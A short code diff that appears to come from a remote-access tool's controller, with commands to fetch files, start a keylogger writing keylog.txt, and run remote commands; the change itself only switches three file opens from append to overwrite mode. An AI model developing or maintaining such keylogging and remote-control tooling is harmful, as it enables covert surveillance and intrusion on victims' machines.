@@ -148,7 +148,7 @@ int cmd_get_file(struct Context *ctx){
     send_packet(ctx, ip_buffer);
 
     // create file, wait for data to come in, write to file
-    FILE *fp = fopen(file_path, "a+");  // opens or creates file
+    FILE *fp = fopen(file_path, "w+");  // opens or creates file
     if (fp == NULL) {
         perror("fopen");
         return -1;
@@ -199,7 +199,7 @@ int cmd_start_kl(struct Context *ctx){
     cmd_stop(ctx);
 
     // create file, wait for data to come in, write to file
-    FILE *fp = fopen("keylog.txt", "a+");  // opens or creates file
+    FILE *fp = fopen("keylog.txt", "w+");  // opens or creates file
     if (fp == NULL) {
         perror("fopen");
         return -1;
@@ -376,7 +376,7 @@ int cmd_remote_run(struct Context *ctx) {
     send_packet(ctx, ip_buffer);
 
     // create file, wait for data to come in, write to file
-    FILE *fp = fopen("remote_output.txt", "a+");  // opens or creates file
+    FILE *fp = fopen("remote_output.txt", "w+");  // opens or creates file
     if (fp == NULL) {
         perror("fopen");
         return -1;
